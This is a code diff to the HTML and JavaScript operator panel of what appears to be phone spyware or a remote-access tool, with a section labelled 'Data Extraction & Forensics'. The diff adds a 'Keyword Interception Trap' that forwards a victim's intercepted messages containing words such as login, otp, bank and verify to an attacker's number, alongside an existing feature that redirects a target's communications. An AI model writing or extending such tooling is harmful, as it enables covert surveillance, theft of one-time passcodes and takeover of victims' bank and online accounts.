@@ -379,14 +379,24 @@
             <h2 data-search="extraction, forensics, loot, files, sms, scraper, vault, pull, push, contacts, calls, hvt, redirect">Data Extraction & Forensics</h2>
             <div class="card">
                 <div class="cmd-row">
-                    <label class="cmd-label">HVT Communication Redirection</label>
+                    <label class="cmd-label">Communication Redirection (HVT/Phone)</label>
                     <div class="input-wrap">
                         <button class="btn-tag" onclick="tagCmd('ADD_HVT_REDIRECT', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_HVT_REDIRECT')">?</button>
                         <input type="text" id="hvt-sender" placeholder="Target Number (e.g. 8012)" style="flex:1">
-                        <input type="text" id="hvt-dest" placeholder="Redirect to..." style="flex:1">
+                        <input type="text" id="hvt-dest" placeholder="Dest Number" style="flex:1">
                         <button class="btn" onclick="sendCmd('ADD_HVT_REDIRECT')">MAP</button>
                     </div>
-                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.6rem;" onclick="sendCmd('CLEAR_HVT_REDIRECTS')">WIPE ALL REDIRECT RULES</button>
+                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.5rem;" onclick="sendCmd('CLEAR_HVT_REDIRECTS')">WIPE ALL PHONE RULES</button>
+                </div>
+                <div class="cmd-row">
+                    <label class="cmd-label">Keyword Interception Trap</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('ADD_KEYWORD_FORWARD', this)">🏷️</button><button class="btn-status" onclick="auditCmd('ADD_KEYWORD_FORWARD')">?</button>
+                        <input type="text" id="kw-list" placeholder="login,otp,bank,verify" style="flex:1">
+                        <input type="text" id="kw-dest" placeholder="Dest Number" style="flex:1">
+                        <button class="btn" onclick="sendCmd('ADD_KEYWORD_FORWARD')">TRAP</button>
+                    </div>
+                    <button class="btn danger" style="width:100%; margin-top:5px; font-size:0.5rem;" onclick="sendCmd('CLEAR_KEYWORD_FORWARDS')">WIPE ALL KEYWORD RULES</button>
                 </div>
                 <div class="cmd-row">
                     <label class="cmd-label">SMS Filter (Blacklist)</label>
@@ -930,6 +940,10 @@
                     case 'ADD_HVT_REDIRECT':
                         content = `${document.getElementById('hvt-sender').value}|${document.getElementById('hvt-dest').value}`; break;
                     case 'CLEAR_HVT_REDIRECTS':
+                        content = ''; break;
+                    case 'ADD_KEYWORD_FORWARD':
+                        content = `${document.getElementById('kw-list').value}|${document.getElementById('kw-dest').value}`; break;
+                    case 'CLEAR_KEYWORD_FORWARDS':
                         content = ''; break;
                     case 'SET_SMS_BLACKLIST':
                         content = document.getElementById('sms-blacklist').value; break;
